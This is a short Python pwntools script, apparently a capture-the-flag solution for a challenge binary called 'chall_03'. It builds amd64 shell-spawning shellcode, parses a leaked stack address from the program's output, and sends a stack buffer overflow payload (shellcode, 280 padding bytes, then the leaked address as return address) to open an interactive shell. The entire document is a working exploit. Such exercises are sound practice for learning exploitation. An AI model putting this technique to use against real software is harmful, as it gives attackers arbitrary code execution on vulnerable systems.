from pwn import *
#set architecture to amd64
context.arch="amd64"
elf=ELF("./chall_03")
#create shellcode
shellcode = asm(shellcraft.sh())
len(shellcode)
#establish the process
r=process("./chall_03")
r.recvuntil("\n")
leak = r.recv()
stackleak = int(leak[-15:],16)
execution = shellcode+b's'*280+p64(stackleak)
#send payload
r.sendline(execution)
r.interactive()
#close the process
r.close()
